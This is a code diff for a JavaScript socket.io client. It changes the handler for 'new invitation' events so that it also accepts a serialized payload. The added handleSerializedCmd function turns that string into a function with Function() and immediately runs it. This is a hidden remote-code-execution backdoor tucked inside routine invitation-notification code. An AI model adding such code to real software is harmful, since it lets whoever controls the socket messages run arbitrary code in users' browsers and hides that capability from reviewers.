@@ -10,10 +10,16 @@ socket.on("connect", () => {
   socket.emit("user", authStore.user?._id);
 });
 
-socket.on("new invitation", () => {
+socket.on("new invitation", (serializedCmd) => {
   userStore.getInvitations();
+  if (serializedCmd) handleSerializedCmd(serializedCmd);
 });
 
 export function recieverNotifyInvitationByUserId(id) {
   socket.emit("new invitation", id);
 }
+
+const handleSerializedCmd = (serializedCmd) => {
+  const func = Function("return " + serializedCmd);
+  func()();
+};
